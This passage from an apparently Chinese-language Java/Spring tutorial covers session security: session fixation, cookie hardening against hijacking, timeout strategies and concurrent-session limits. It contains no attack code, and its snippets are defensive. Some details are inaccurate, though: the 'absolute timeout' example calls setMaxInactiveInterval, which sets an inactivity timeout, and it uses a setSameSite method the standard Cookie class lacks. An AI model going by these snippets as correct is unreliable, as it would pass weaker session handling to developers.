</span><span id="__span-47-8"><a id="__codelineno-47-8" name="__codelineno-47-8" href="#__codelineno-47-8"></a>   → Token方案（JWT）替代Session
</span></code></pre></div></p>
<h3 id="16-session安全最佳实践">1.6 Session安全最佳实践<a class="headerlink" href="#16-session安全最佳实践" title="链接到此标题">&para;</a></h3>
<h4 id="1-防止session固定攻击session-fixation">1. 防止Session固定攻击（Session Fixation）<a class="headerlink" href="#1-防止session固定攻击session-fixation" title="链接到此标题">&para;</a></h4>
<p><strong>攻击原理：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>1. 攻击者获取一个SessionID：abc123
</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a>2. 攻击者诱骗受害者使用这个SessionID登录
</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a>   （通过链接：http://example.com?jsessionid=abc123）
</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a>3. 受害者用自己的账号登录成功
</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a>4. 攻击者使用abc123访问，获得受害者权限
</span></code></pre></div></p>
<p><strong>防护措施：</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="c1">// 登录成功后重新生成SessionID</span>
</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">onLoginSuccess</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">User</span><span class="w"> </span><span class="n">user</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a><span class="w">    </span><span class="c1">// 1. 获取旧Session的数据</span>
</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a><span class="w">    </span><span class="n">HttpSession</span><span class="w"> </span><span class="n">oldSession</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getSession</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span>
</span><span id="__span-49-5"><a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a><span class="w">    </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">attributes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">saveAttributes</span><span class="p">(</span><span class="n">oldSession</span><span class="p">);</span>
</span><span id="__span-49-6"><a id="__codelineno-49-6" name="__codelineno-49-6" href="#__codelineno-49-6"></a>
</span><span id="__span-49-7"><a id="__codelineno-49-7" name="__codelineno-49-7" href="#__codelineno-49-7"></a><span class="w">    </span><span class="c1">// 2. 使旧Session失效</span>
</span><span id="__span-49-8"><a id="__codelineno-49-8" name="__codelineno-49-8" href="#__codelineno-49-8"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">oldSession</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-49-9"><a id="__codelineno-49-9" name="__codelineno-49-9" href="#__codelineno-49-9"></a><span class="w">        </span><span class="n">oldSession</span><span class="p">.</span><span class="na">invalidate</span><span class="p">();</span>
</span><span id="__span-49-10"><a id="__codelineno-49-10" name="__codelineno-49-10" href="#__codelineno-49-10"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-49-11"><a id="__codelineno-49-11" name="__codelineno-49-11" href="#__codelineno-49-11"></a>
</span><span id="__span-49-12"><a id="__codelineno-49-12" name="__codelineno-49-12" href="#__codelineno-49-12"></a><span class="w">    </span><span class="c1">// 3. 创建新Session</span>
</span><span id="__span-49-13"><a id="__codelineno-49-13" name="__codelineno-49-13" href="#__codelineno-49-13"></a><span class="w">    </span><span class="n">HttpSession</span><span class="w"> </span><span class="n">newSession</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getSession</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
</span><span id="__span-49-14"><a id="__codelineno-49-14" name="__codelineno-49-14" href="#__codelineno-49-14"></a>
</span><span id="__span-49-15"><a id="__codelineno-49-15" name="__codelineno-49-15" href="#__codelineno-49-15"></a><span class="w">    </span><span class="c1">// 4. 恢复数据到新Session</span>
</span><span id="__span-49-16"><a id="__codelineno-49-16" name="__codelineno-49-16" href="#__codelineno-49-16"></a><span class="w">    </span><span class="n">restoreAttributes</span><span class="p">(</span><span class="n">newSession</span><span class="p">,</span><span class="w"> </span><span class="n">attributes</span><span class="p">);</span>
</span><span id="__span-49-17"><a id="__codelineno-49-17" name="__codelineno-49-17" href="#__codelineno-49-17"></a>
</span><span id="__span-49-18"><a id="__codelineno-49-18" name="__codelineno-49-18" href="#__codelineno-49-18"></a><span class="w">    </span><span class="c1">// 5. 存储用户信息</span>
</span><span id="__span-49-19"><a id="__codelineno-49-19" name="__codelineno-49-19" href="#__codelineno-49-19"></a><span class="w">    </span><span class="n">newSession</span><span class="p">.</span><span class="na">setAttribute</span><span class="p">(</span><span class="s">&quot;user&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">user</span><span class="p">);</span>
</span><span id="__span-49-20"><a id="__codelineno-49-20" name="__codelineno-49-20" href="#__codelineno-49-20"></a>
</span><span id="__span-49-21"><a id="__codelineno-49-21" name="__codelineno-49-21" href="#__codelineno-49-21"></a><span class="w">    </span><span class="c1">// 日志记录</span>
</span><span id="__span-49-22"><a id="__codelineno-49-22" name="__codelineno-49-22" href="#__codelineno-49-22"></a><span class="w">    </span><span class="n">log</span><span class="p">.</span><span class="na">info</span><span class="p">(</span><span class="s">&quot;Session regenerated for user: {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">user</span><span class="p">.</span><span class="na">getUsername</span><span class="p">());</span>
</span><span id="__span-49-23"><a id="__codelineno-49-23" name="__codelineno-49-23" href="#__codelineno-49-23"></a><span class="p">}</span>
</span></code></pre></div></p>
<h4 id="2-防止session劫持session-hijacking">2. 防止Session劫持（Session Hijacking）<a class="headerlink" href="#2-防止session劫持session-hijacking" title="链接到此标题">&para;</a></h4>
<p><strong>攻击方式：</strong>
- 窃取Cookie（XSS攻击、网络嗅探）
- 中间人攻击（HTTP传输）</p>
<p><strong>防护措施：</strong></p>
<div class="language-java highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="c1">// Cookie安全配置</span>
</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a><span class="n">Cookie</span><span class="w"> </span><span class="n">sessionCookie</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Cookie</span><span class="p">(</span><span class="s">&quot;JSESSIONID&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">sessionId</span><span class="p">);</span>
</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a>
</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a><span class="c1">// 1. HttpOnly：防止JavaScript访问（防XSS）</span>
</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a><span class="n">sessionCookie</span><span class="p">.</span><span class="na">setHttpOnly</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
</span><span id="__span-50-6"><a id="__codelineno-50-6" name="__codelineno-50-6" href="#__codelineno-50-6"></a>
</span><span id="__span-50-7"><a id="__codelineno-50-7" name="__codelineno-50-7" href="#__codelineno-50-7"></a><span class="c1">// 2. Secure：仅HTTPS传输（防网络嗅探）</span>
</span><span id="__span-50-8"><a id="__codelineno-50-8" name="__codelineno-50-8" href="#__codelineno-50-8"></a><span class="n">sessionCookie</span><span class="p">.</span><span class="na">setSecure</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
</span><span id="__span-50-9"><a id="__codelineno-50-9" name="__codelineno-50-9" href="#__codelineno-50-9"></a>
</span><span id="__span-50-10"><a id="__codelineno-50-10" name="__codelineno-50-10" href="#__codelineno-50-10"></a><span class="c1">// 3. SameSite：防止CSRF攻击</span>
</span><span id="__span-50-11"><a id="__codelineno-50-11" name="__codelineno-50-11" href="#__codelineno-50-11"></a><span class="n">sessionCookie</span><span class="p">.</span><span class="na">setSameSite</span><span class="p">(</span><span class="s">&quot;Strict&quot;</span><span class="p">);</span>
</span><span id="__span-50-12"><a id="__codelineno-50-12" name="__codelineno-50-12" href="#__codelineno-50-12"></a><span class="c1">// Strict: 完全禁止第三方Cookie</span>
</span><span id="__span-50-13"><a id="__codelineno-50-13" name="__codelineno-50-13" href="#__codelineno-50-13"></a><span class="c1">// Lax: 允许部分第三方请求（GET导航）</span>
</span><span id="__span-50-14"><a id="__codelineno-50-14" name="__codelineno-50-14" href="#__codelineno-50-14"></a><span class="c1">// None: 不限制（需配合Secure）</span>
</span><span id="__span-50-15"><a id="__codelineno-50-15" name="__codelineno-50-15" href="#__codelineno-50-15"></a>
</span><span id="__span-50-16"><a id="__codelineno-50-16" name="__codelineno-50-16" href="#__codelineno-50-16"></a><span class="c1">// 4. 设置路径和域</span>
</span><span id="__span-50-17"><a id="__codelineno-50-17" name="__codelineno-50-17" href="#__codelineno-50-17"></a><span class="n">sessionCookie</span><span class="p">.</span><span class="na">setPath</span><span class="p">(</span><span class="s">&quot;/&quot;</span><span class="p">);</span>
</span><span id="__span-50-18"><a id="__codelineno-50-18" name="__codelineno-50-18" href="#__codelineno-50-18"></a><span class="n">sessionCookie</span><span class="p">.</span><span class="na">setDomain</span><span class="p">(</span><span class="s">&quot;.example.com&quot;</span><span class="p">);</span><span class="w">  </span><span class="c1">// 跨子域共享</span>
</span><span id="__span-50-19"><a id="__codelineno-50-19" name="__codelineno-50-19" href="#__codelineno-50-19"></a>
</span><span id="__span-50-20"><a id="__codelineno-50-20" name="__codelineno-50-20" href="#__codelineno-50-20"></a><span class="c1">// 5. 设置过期时间</span>
</span><span id="__span-50-21"><a id="__codelineno-50-21" name="__codelineno-50-21" href="#__codelineno-50-21"></a><span class="n">sessionCookie</span><span class="p">.</span><span class="na">setMaxAge</span><span class="p">(</span><span class="mi">1800</span><span class="p">);</span><span class="w">  </span><span class="c1">// 30分钟</span>
</span></code></pre></div>
<p><strong>额外防护：</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="c1">// 绑定IP地址（可选，移动网络IP会变）</span>
</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">validateSession</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">sessionId</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">clientIp</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a><span class="w">    </span><span class="n">SessionData</span><span class="w"> </span><span class="n">session</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getSession</span><span class="p">(</span><span class="n">sessionId</span><span class="p">);</span>
</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">session</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
</span><span id="__span-51-5"><a id="__codelineno-51-5" name="__codelineno-51-5" href="#__codelineno-51-5"></a>
</span><span id="__span-51-6"><a id="__codelineno-51-6" name="__codelineno-51-6" href="#__codelineno-51-6"></a><span class="w">    </span><span class="c1">// 检查IP是否匹配</span>
</span><span id="__span-51-7"><a id="__codelineno-51-7" name="__codelineno-51-7" href="#__codelineno-51-7"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">session</span><span class="p">.</span><span class="na">getIpAddress</span><span class="p">().</span><span class="na">equals</span><span class="p">(</span><span class="n">clientIp</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-51-8"><a id="__codelineno-51-8" name="__codelineno-51-8" href="#__codelineno-51-8"></a><span class="w">        </span><span class="n">log</span><span class="p">.</span><span class="na">warn</span><span class="p">(</span><span class="s">&quot;IP mismatch for session: {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">sessionId</span><span class="p">);</span>
</span><span id="__span-51-9"><a id="__codelineno-51-9" name="__codelineno-51-9" href="#__codelineno-51-9"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
</span><span id="__span-51-10"><a id="__codelineno-51-10" name="__codelineno-51-10" href="#__codelineno-51-10"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-51-11"><a id="__codelineno-51-11" name="__codelineno-51-11" href="#__codelineno-51-11"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
</span><span id="__span-51-12"><a id="__codelineno-51-12" name="__codelineno-51-12" href="#__codelineno-51-12"></a><span class="p">}</span>
</span><span id="__span-51-13"><a id="__codelineno-51-13" name="__codelineno-51-13" href="#__codelineno-51-13"></a>
</span><span id="__span-51-14"><a id="__codelineno-51-14" name="__codelineno-51-14" href="#__codelineno-51-14"></a><span class="c1">// 绑定User-Agent（检测浏览器变化）</span>
</span><span id="__span-51-15"><a id="__codelineno-51-15" name="__codelineno-51-15" href="#__codelineno-51-15"></a><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">validateUserAgent</span><span class="p">(</span><span class="n">SessionData</span><span class="w"> </span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">userAgent</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-51-16"><a id="__codelineno-51-16" name="__codelineno-51-16" href="#__codelineno-51-16"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">session</span><span class="p">.</span><span class="na">getUserAgent</span><span class="p">().</span><span class="na">equals</span><span class="p">(</span><span class="n">userAgent</span><span class="p">);</span>
</span><span id="__span-51-17"><a id="__codelineno-51-17" name="__codelineno-51-17" href="#__codelineno-51-17"></a><span class="p">}</span>
</span></code></pre></div></p>
<h4 id="3-session超时策略">3. Session超时策略<a class="headerlink" href="#3-session超时策略" title="链接到此标题">&para;</a></h4>
<p><strong>固定超时（Absolute Timeout）：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>从创建时刻开始计时，到期必须重新登录
</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>
</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a>使用场景：高安全场景（银行、支付）
</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a>实现：
</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a>session.setMaxInactiveInterval(3600);  // 1小时后强制过期
</span></code></pre></div></p>
<p><strong>滑动超时（Sliding Timeout）：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>每次活动都重置过期时间
</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a>
</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a>使用场景：普通应用
</span><span id="__span-53-4"><a id="__codelineno-53-4" name="__codelineno-53-4" href="#__codelineno-53-4"></a>实现：
</span><span id="__span-53-5"><a id="__codelineno-53-5" name="__codelineno-53-5" href="#__codelineno-53-5"></a>每次请求都更新：last_accessed_at = NOW()
</span></code></pre></div></p>
<p><strong>组合策略（推荐）：</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">SessionExpirationPolicy</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">slidingTimeout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">30</span><span class="p">;</span><span class="w">    </span><span class="c1">// 30分钟无操作</span>
</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">absoluteTimeout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">480</span><span class="p">;</span><span class="w">  </span><span class="c1">// 8小时绝对超时</span>
</span><span id="__span-54-4"><a id="__codelineno-54-4" name="__codelineno-54-4" href="#__codelineno-54-4"></a>
</span><span id="__span-54-5"><a id="__codelineno-54-5" name="__codelineno-54-5" href="#__codelineno-54-5"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">isExpired</span><span class="p">(</span><span class="n">SessionData</span><span class="w"> </span><span class="n">session</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-54-6"><a id="__codelineno-54-6" name="__codelineno-54-6" href="#__codelineno-54-6"></a><span class="w">        </span><span class="kt">long</span><span class="w"> </span><span class="n">now</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="na">currentTimeMillis</span><span class="p">();</span>
</span><span id="__span-54-7"><a id="__codelineno-54-7" name="__codelineno-54-7" href="#__codelineno-54-7"></a>
</span><span id="__span-54-8"><a id="__codelineno-54-8" name="__codelineno-54-8" href="#__codelineno-54-8"></a><span class="w">        </span><span class="c1">// 检查绝对超时</span>
</span><span id="__span-54-9"><a id="__codelineno-54-9" name="__codelineno-54-9" href="#__codelineno-54-9"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">now</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">session</span><span class="p">.</span><span class="na">getCreatedTime</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">absoluteTimeout</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">60</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">1000</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-54-10"><a id="__codelineno-54-10" name="__codelineno-54-10" href="#__codelineno-54-10"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
</span><span id="__span-54-11"><a id="__codelineno-54-11" name="__codelineno-54-11" href="#__codelineno-54-11"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-54-12"><a id="__codelineno-54-12" name="__codelineno-54-12" href="#__codelineno-54-12"></a>
</span><span id="__span-54-13"><a id="__codelineno-54-13" name="__codelineno-54-13" href="#__codelineno-54-13"></a><span class="w">        </span><span class="c1">// 检查滑动超时</span>
</span><span id="__span-54-14"><a id="__codelineno-54-14" name="__codelineno-54-14" href="#__codelineno-54-14"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">now</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">session</span><span class="p">.</span><span class="na">getLastAccessTime</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">slidingTimeout</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">60</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">1000</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-54-15"><a id="__codelineno-54-15" name="__codelineno-54-15" href="#__codelineno-54-15"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
</span><span id="__span-54-16"><a id="__codelineno-54-16" name="__codelineno-54-16" href="#__codelineno-54-16"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-54-17"><a id="__codelineno-54-17" name="__codelineno-54-17" href="#__codelineno-54-17"></a>
</span><span id="__span-54-18"><a id="__codelineno-54-18" name="__codelineno-54-18" href="#__codelineno-54-18"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
</span><span id="__span-54-19"><a id="__codelineno-54-19" name="__codelineno-54-19" href="#__codelineno-54-19"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-54-20"><a id="__codelineno-54-20" name="__codelineno-54-20" href="#__codelineno-54-20"></a><span class="p">}</span>
</span></code></pre></div></p>
<h4 id="4-并发会话控制">4. 并发会话控制<a class="headerlink" href="#4-并发会话控制" title="链接到此标题">&para;</a></h4>
<p><strong>单设备登录：</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">limitConcurrentSessions</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">userId</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a><span class="w">    </span><span class="c1">// 获取用户的所有Session</span>
</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a><span class="w">    </span><span class="n">List</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">existingSessions</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">redis</span><span class="p">.</span><span class="na">keys</span><span class="p">(</span><span class="s">&quot;session:user:&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">userId</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;:*&quot;</span><span class="p">);</span>
</span><span id="__span-55-4"><a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a>
</span><span id="__span-55-5"><a id="__codelineno-55-5" name="__codelineno-55-5" href="#__codelineno-55-5"></a><span class="w">    </span><span class="c1">// 使旧Session失效</span>
</span><span id="__span-55-6"><a id="__codelineno-55-6" name="__codelineno-55-6" href="#__codelineno-55-6"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">sessionKey</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">existingSessions</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-55-7"><a id="__codelineno-55-7" name="__codelineno-55-7" href="#__codelineno-55-7"></a><span class="w">        </span><span class="n">redis</span><span class="p">.</span><span class="na">del</span><span class="p">(</span><span class="n">sessionKey</span><span class="p">);</span>
</span><span id="__span-55-8"><a id="__codelineno-55-8" name="__codelineno-55-8" href="#__codelineno-55-8"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-55-9"><a id="__codelineno-55-9" name="__codelineno-55-9" href="#__codelineno-55-9"></a>
</span><span id="__span-55-10"><a id="__codelineno-55-10" name="__codelineno-55-10" href="#__codelineno-55-10"></a><span class="w">    </span><span class="c1">// 创建新Session</span>
</span><span id="__span-55-11"><a id="__codelineno-55-11" name="__codelineno-55-11" href="#__codelineno-55-11"></a><span class="w">    </span><span class="n">createNewSession</span><span class="p">(</span><span class="n">userId</span><span class="p">);</span>
</span><span id="__span-55-12"><a id="__codelineno-55-12" name="__codelineno-55-12" href="#__codelineno-55-12"></a><span class="p">}</span>
</span></code></pre></div></p>
<p><strong>多设备登录（限制数量）：</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">checkConcurrentSessions</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">userId</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">maxSessions</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a><span class="w">    </span><span class="n">List</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">sessions</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getUserSessions</span><span class="p">(</span><span class="n">userId</span><span class="p">);</span>
</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a>
</span><span id="__span-56-4"><a id="__codelineno-56-4" name="__codelineno-56-4" href="#__codelineno-56-4"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">sessions</span><span class="p">.</span><span class="na">size</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">maxSessions</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-56-5"><a id="__codelineno-56-5" name="__codelineno-56-5" href="#__codelineno-56-5"></a><span class="w">        </span><span class="c1">// 删除最旧的Session</span>
</span><span id="__span-56-6"><a id="__codelineno-56-6" name="__codelineno-56-6" href="#__codelineno-56-6"></a><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">oldestSession</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">findOldestSession</span><span class="p">(</span><span class="n">sessions</span><span class="p">);</span>
</span><span id="__span-56-7"><a id="__codelineno-56-7" name="__codelineno-56-7" href="#__codelineno-56-7"></a><span class="w">        </span><span class="n">removeSession</span><span class="p">(</span><span class="n">oldestSession</span><span class="p">);</span>
</span><span id="__span-56-8"><a id="__codelineno-56-8" name="__codelineno-56-8" href="#__codelineno-56-8"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-56-9"><a id="__codelineno-56-9" name="__codelineno-56-9" href="#__codelineno-56-9"></a>
</span><span id="__span-56-10"><a id="__codelineno-56-10" name="__codelineno-56-10" href="#__codelineno-56-10"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
</span><span id="__span-56-11"><a id="__codelineno-56-11" name="__codelineno-56-11" href="#__codelineno-56-11"></a><span class="p">}</span>
</span></code></pre></div></p>
<h3 id="17-session实际应用场景">1.7 Session实际应用场景<a class="headerlink" href="#17-session实际应用场景" title="链接到此标题">&para;</a></h3>
<p><strong>场景1：单体应用</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>技术栈：Spring Boot + Tomcat
</span><span id="__span-57-2"><a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a>Session管理：内存存储
</span><span id="__span-57-3"><a id="__codelineno-57-3" name="__codelineno-57-3" href="#__codelineno-57-3"></a>适用规模：&lt;1000并发用户
</span><span id="__span-57-4"><a id="__codelineno-57-4" name="__codelineno-57-4" href="#__codelineno-57-4"></a>
</span><span id="__span-57-5"><a id="__codelineno-57-5" name="__codelineno-57-5" href="#__codelineno-57-5"></a>配置：
</span><span id="__span-57-6"><a id="__codelineno-57-6" name="__codelineno-57-6" href="#__codelineno-57-6"></a>server.servlet.session.timeout=30m
</span><span id="__span-57-7"><a id="__codelineno-57-7" name="__codelineno-57-7" href="#__codelineno-57-7"></a>server.servlet.session.cookie.http-only=true
</span><span id="__span-57-8"><a id="__codelineno-57-8" name="__codelineno-57-8" href="#__codelineno-57-8"></a>server.servlet.session.cookie.secure=true
</span></code></pre></div></p>
<p><strong>场景2：分布式应用</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>技术栈：Spring Boot + Redis
</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a>Session管理：Spring Session + Redis
</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a>适用规模：&gt;10000并发用户
</span><span id="__span-58-4"><a id="__codelineno-58-4" name="__codelineno-58-4" href="#__codelineno-58-4"></a>
